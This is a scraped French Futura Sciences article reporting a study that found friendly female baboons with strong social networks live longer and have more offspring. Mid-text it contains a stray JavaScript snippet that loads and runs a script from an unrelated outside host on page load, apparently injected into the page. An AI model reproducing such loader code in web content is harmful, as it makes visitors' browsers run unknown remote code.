{"title": "Les babouins les plus gentils s'en sortent le mieux dans la vie", "newspaper": "Futura Sciences", "author": ["Par Janlou Chaput, Futura"], "date_publi": "2012-10-03", "content": "Le 3 novembre se celebre la Journee mondiale de la gentillesse. Etre gentil au quotidien traduit un etat d'esprit positif et une approche apaisee de l'autre. Etre gentil serait donc bon pour notre sante... et a en croire une etude publiee il y a quelques annees deja... pour celle des babouins aussi. Alors qu'on cherche souvent a resumer le succes reproducteur des primates a leur rang dans la hierarchie, cette etude suggere que le plus important chez les babouins femelles est d'entretenir un bon reseau social. Elles accordent donc de l'interet a la personnalite des singes. Et a ce petit jeu, ce sont les plus gentilles qui s'en sortent le mieux. Article paru le 3 octobre 2012 Peu a peu les cliches tombent. Trop souvent encore, la  theorie de l'evolution  par la selection naturelle de  Charles Darwin  est decrite de maniere simpliste comme la loi du plus fort. Grosse erreur car parfois elle pourrait etre la loi du plus gentil. C'est en tout cas ce que suggerent des recherches menees par des Americains de l' University of Pennsylvania  aupres de femelles babouins sauvages ( Papio hamadryas ursinus ). Chez ces  primates  sociaux,  males  et femelles sont un peu differents. Pour ces premiers, la hierarchie est un critere determinant pour expliquer la survie ou la reproduction. En revanche, ce n'est pas tout a fait le cas chez les guenons. Si le rang social et ses avantages (notamment l'acces a la nourriture ou l'interet suscite aupres des males dominants) sont herites de la mere, ils n'expliquent que partiellement le succes des femelles. Car celles qui vivent le plus longtemps et avec une descendance nombreuse sont les moins  stressees  et disposent surtout d'un  reseau social  fort et bien fourni.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Etre gentil, c'est l'assurance d'avoir plein d'amis Les chercheurs ont souhaite comprendre pourquoi certaines guenons tissaient des liens sociaux plus etroits que les autres. Leur reponse, fournie dans la revue  Pnas , indique que, comme chez l'Homme, ce n'est qu'une histoire de  personnalite  et de caractere. Et pour se faire apprecier de ses congeneres, rien de mieux que de se montrer sympathique. L'experience est basee sur l'observation de babouins sauvages vivant dans la  Moremi Game Reserve , au Botswana, entre 2001 et 2007. Quarante-cinq femelles ont ete epiees dans leurs relations sociales avec les autres : temps passe a cote d'un individu ou a le toiletter, interactions sociales amicales ou agressives... Les niveaux de  stress  ont ete estimes a partir des taux d' hormones  retrouves dans les dejections. Le toilettage est une activite sociale par excellence chez les babouins. D'une part c'est hygienique puisqu'il s'agit de debarrasser les poils de ses parasites, mais c'est aussi l'occasion de renforcer les liens qui unissent les individus. (c) Anne Engh,  University of Pennsylvania                               La personnalite comme moteur de la selection naturelle En fonction des comportements de chacune, les femelles ont ete classees en trois groupes. Un premier, celui des gentilles, comprenait les guenons qui s'entendaient bien avec toutes les femelles et entretenaient des  liens sociaux  etroits et stables avec bon nombre d'entre elles. Elles emettaient meme des grognements amicaux en signe d'apaisement aux individus sans enfants situes plus bas dans la hierarchie, un acte de  sympathie  completement gratuit pour montrer leurs bonnes intentions. L'appartenance a ce groupe etait independante du statut social. Un deuxieme lot regroupait des femelles plus distantes qui savaient se montrer  agressives  avec certaines de leurs congeneres. En revanche, elles disposaient aussi de cercles sociaux certes plus restreints que les guenons gentilles, mais relativement  solides  malgre tout, leur assurant un bon  succes reproducteur . Enfin, les individus solitaires composaient le troisieme groupe pour les chercheurs. Ces  singes  esquissaient davantage de comportements agressifs a l'egard des autres membres de leur tribu, changeaient regulierement de partenaire de toilettage et adressaient des grognements amicaux uniquement aux femelles de rang plus eleve, probablement pour eviter des reprimandes. Avec, de fait, des liens sociaux instables et parcellaires. C'est aussi chez elles qu'on a retrouve les plus hauts niveaux de  stress  et les  esperances de vie  les plus courtes, aussi bien pour elles que pour leurs descendants. Des babouins aux traits humains Se pose une question pour l'instant sans reponse : quel est l'interet pour ces femelles de s'isoler du reste du groupe puisqu'elles vivent moins longtemps et donnent naissance a une descendance moins nombreuse et plus fragile ? Peut-etre la malchance d'etre nee dans une famille peu nombreuse ou de jouir d'un  statut social  inferieur ? Meme pas ! Ces parametres semblent manquer de pertinence puisque leur classement dans l'un des trois groupes ne depend pas de la hierarchie ni de la quantite d'individus apparentes, mais bel et bien de la personnalite. C'est d'ailleurs la premiere etude du genre a reveler un lien entre des traits de caractere individuels et le succes reproducteur chez des primates sauvages. Comme nous, ils s'apparient avec les partenaires pour lesquels ils ont davantage d'affinites et comme nous, les individus les plus sociaux vivent plus longtemps et surtout plus  heureux . Primates des Caraibes, des macaques sous surveillance                       Captifs sur leur ile deserte, les macaques rhesus ont depuis 1938 cree une vaste societe ou tout n'est pas rose. Pour les ethologues, c'est un laboratoire permanent pour etudier les interactions sociales. (c) Jean-Christophe Ribot, Mosaique Films, Deep Bay Film, Arte France, ZED                                       ", "theme": "sante"}